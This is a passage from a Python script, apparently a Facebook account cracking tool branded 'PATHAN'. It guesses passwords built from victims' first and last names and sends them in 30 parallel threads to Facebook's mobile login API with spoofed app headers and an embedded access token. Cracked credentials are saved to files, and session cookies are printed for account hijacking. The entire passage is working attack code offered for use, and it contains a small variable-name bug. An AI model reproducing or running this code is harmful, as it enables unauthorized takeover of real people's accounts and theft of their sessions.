            heads = "'[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mPATHAN-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/PATHAN-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;92mPATHAN-CP\033[1;91m] \033[1;92m'+acc+' \033[1;91m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/PATHAN-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;92mPATHAN-M2\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = '[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mPATHAN-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/PATHAN-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;92mCookie\033[1;93m] \033[1;92m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;92mPATHAN-CP\033[1;91m] \033[1;92m'+acc+' \033[1;91m•\033[1;92m '+pword)
                cpacc.append(acc)
                open('/sdcard/PATHAN-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




PATHAN_Main()
